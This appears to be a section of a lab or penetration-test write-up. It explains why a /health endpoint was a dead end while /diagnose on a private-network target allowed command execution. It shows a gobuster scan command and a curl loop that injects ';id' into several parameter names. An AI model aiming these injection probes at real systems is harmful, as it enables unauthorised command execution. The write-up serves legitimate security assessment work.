# Rabbit-Hole Analysis

During the assessment, one enumeration path was investigated and probed and ultimately discarded as non-productive.

## `/health` Endpoint

**Observation:** A directory scan against the web application on port 8080 was run with:

```
gobuster dir -u http://192.168.56.21:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

`/health` (Status: 200, Size: 16) surfaced before the first progress checkpoint, at roughly 3.86% into the wordlist. The actual vulnerable endpoint, `/diagnose` (Status: 200, Size: 253), did not appear until shortly before the 90.45% checkpoint. The scan had to work through nearly the entire wordlist before it surfaced.

Earlier enumeration attempts using smaller, default wordlists such as `/usr/share/wordlists/dirb/common.txt` did not surface `/diagnose` at all. With those wordlists, `/health` appeared to be the only diagnostic-style endpoint on the application, making it a misleading focus for early testing. It was the only lead until a larger wordlist (`directory-list-2.3-medium.txt`) was used.

**Testing:** Eight plausible parameter names were tried against `/health`, each with an injected `;id`:

```bash
for param in ip addr address target server domain host node; do
  echo -n "[$param] "
  curl -s "http://192.168.56.21:8080/health?$param=127.0.0.1;id"
  echo ""
done
```

Every request returned only `{"status": "ok"}`, regardless of parameter name or payload, no command output, no variation in response.

The identical set of parameter names and payload was then tried against `/diagnose`. All eight returned real output: host information from the target, and for the `host` parameter specifically, a live `id` result confirming command execution as the `support` user.

